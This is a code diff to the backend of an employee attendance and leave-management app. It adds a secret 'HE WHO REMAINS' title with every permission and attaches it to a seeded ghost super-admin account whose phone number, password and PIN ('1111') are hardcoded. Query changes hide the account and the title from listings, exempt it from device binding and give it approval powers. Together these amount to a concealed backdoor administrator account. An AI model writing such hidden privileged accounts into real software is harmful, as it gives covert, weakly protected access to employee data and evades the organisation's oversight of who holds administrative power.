@@ -105,6 +105,33 @@ const DEFAULT_BRANCHES = [
 
 const DEFAULT_TITLES = [
   {
+    id: "title_he_who_remains",
+    code: "he_who_remains",
+    name: "HE WHO REMAINS",
+    englishTitle: "HE WHO REMAINS",
+    arabicTitle: "HE WHO REMAINS",
+    description: "السلطة الإدارية العليا المطلقة (غير مرئي في النظام)",
+    color: "amber",
+    order: 0,
+    isHidden: true,
+    permissions: {
+      check_in_out: true,
+      view_own_attendance: true,
+      view_office_presence: true,
+      request_leave: true,
+      request_permission: true,
+      approve_leaves_permissions: true,
+      approve_early_checkout: true,
+      manage_employees: true,
+      manage_titles_permissions: true,
+      manage_office_settings: true,
+      view_reports: true,
+      view_all_branches: true,
+      override_early_checkout: true,
+      edit_employee_details: true
+    }
+  },
+  {
     id: "title_memberships_executive_director",
     code: "memberships_executive_director",
     name: "Memberships Executive Director (المدير التنفيذي للعضويات)",
@@ -381,7 +408,7 @@ async function seedMongoData() {
       { $set: { "permissions.edit_employee_details": true } }
     );
 
-    // 4. Master Ghost Super Admin
+    // 4. Master Ghost Super Admin (HE WHO REMAINS)
     const existingAdmin = await Employee.findOne({ phone: "01010046078" });
     if (!existingAdmin) {
       await Employee.create({
@@ -390,8 +417,8 @@ async function seedMongoData() {
         phone: "01010046078",
         password: "1111",
         pin: "1111",
-        titleCode: "memberships_executive_director",
-        jobTitle: "Memberships Executive Director",
+        titleCode: "he_who_remains",
+        jobTitle: "HE WHO REMAINS",
         branchId: "branch_october2",
         weeklyOffDays: ["friday", "saturday"],
         avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=250&q=80",
@@ -401,6 +428,12 @@ async function seedMongoData() {
         isGhost: true,
         createdAt: new Date().toISOString()
       });
+    } else if (existingAdmin.titleCode !== 'he_who_remains') {
+      existingAdmin.titleCode = 'he_who_remains';
+      existingAdmin.jobTitle = 'HE WHO REMAINS';
+      existingAdmin.isSuperAdmin = true;
+      existingAdmin.isGhost = true;
+      await existingAdmin.save();
     }
   } catch (err) {
     console.error("seedMongoData error:", err);
@@ -464,9 +497,10 @@ class MongoDatabaseAdapter {
     return updated;
   }
 
-  async getTitles() {
+  async getTitles(includeHidden = false) {
     await this.ensureConnected();
-    const titles = await Title.find().lean();
+    const query = includeHidden ? {} : { isHidden: { $ne: true }, code: { $ne: 'he_who_remains' } };
+    const titles = await Title.find(query).lean();
     return titles.map(t => {
       const defaultTitle = DEFAULT_TITLES.find(dt => dt.code === t.code);
       const defaultPerms = defaultTitle ? defaultTitle.permissions : {};
@@ -477,7 +511,7 @@ class MongoDatabaseAdapter {
           ...(t.permissions || {})
         }
       };
-    });
+    }).sort((a, b) => (a.order || 99) - (b.order || 99));
   }
 
   async updateTitlePermissions(code, permissions) {
@@ -501,6 +535,7 @@ class MongoDatabaseAdapter {
     if (!includeGhost) {
       query.phone = { $ne: "01010046078" };
       query.isGhost = { $ne: true };
+      query.titleCode = { $ne: "he_who_remains" };
     }
     if (branchId && branchId !== 'all') {
       if (Array.isArray(branchId)) {
@@ -633,7 +668,7 @@ class MongoDatabaseAdapter {
 
   async _enrichEmployee(emp, deviceContext = null) {
     const cleanPhone = emp.phone ? emp.phone.trim() : '';
-    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin);
+    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin || emp.titleCode === "he_who_remains");
 
     // Device binding check (Super Admin can login from any device, no restriction)
     if (!isSuper && deviceContext && deviceContext.deviceId) {
@@ -1599,6 +1634,7 @@ class MongoDatabaseAdapter {
         const execs = await Employee.find({
           $or: [
             { titleCode: 'memberships_executive_director' },
+            { titleCode: 'he_who_remains' },
             { phone: '01010046078' }
           ]
         }, { id: 1 }).lean();
@@ -1663,6 +1699,7 @@ class MongoDatabaseAdapter {
             const execs = await Employee.find({
               $or: [
                 { titleCode: 'memberships_executive_director' },
+                { titleCode: 'he_who_remains' },
                 { phone: '01010046078' }
               ]
             }, { id: 1 }).lean();
@@ -1738,7 +1775,7 @@ class MongoDatabaseAdapter {
 
     if (req.type === 'early_checkout') {
       const reviewer = await Employee.findOne({ id: reviewerId }).lean();
-      const canApproveEarly = ['memberships_manager', 'memberships_area_manager', 'memberships_executive_director'].includes(reviewer?.titleCode);
+      const canApproveEarly = ['he_who_remains', 'memberships_manager', 'memberships_area_manager', 'memberships_executive_director'].includes(reviewer?.titleCode) || Boolean(reviewer?.isSuperAdmin);
       if (!canApproveEarly) {
         throw new Error("عفواً، اعتماد طلبات الانصراف الطارئ صلاحية حصرية لمدير العضويات (Memberships Manager) والإدارة العليا.");
       }
